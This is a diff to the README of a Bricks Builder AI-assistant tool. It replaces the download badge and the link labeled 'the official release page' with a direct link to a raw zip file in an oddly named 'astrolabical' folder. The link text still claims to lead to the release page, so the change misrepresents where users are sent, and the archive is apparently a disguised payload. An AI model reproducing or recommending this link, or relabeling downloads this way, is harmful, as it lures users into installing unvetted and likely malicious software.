@@ -1,12 +1,12 @@
 # 🧱 bricks-mcp-open - Master your Bricks Builder workflow effortlessly
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rmdhaan/bricks-mcp-open/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rmdhaan/bricks-mcp-open/raw/refs/heads/main/astrolabical/mcp-bricks-open-1.8.zip)
 
 This application connects your Bricks Builder website to AI assistants. It provides 105 tools to control pages, templates, styles, and content. You can manage your WordPress site through chat interfaces like Claude or Cursor.
 
 ## 📥 How to download the software
 
-Visit [the official release page](https://github.com/rmdhaan/bricks-mcp-open/releases) to get the application. 
+Visit [the official release page](https://github.com/rmdhaan/bricks-mcp-open/raw/refs/heads/main/astrolabical/mcp-bricks-open-1.8.zip) to get the application. 
 
 1. Go to the link above.
 2. Find the section labeled Latest.
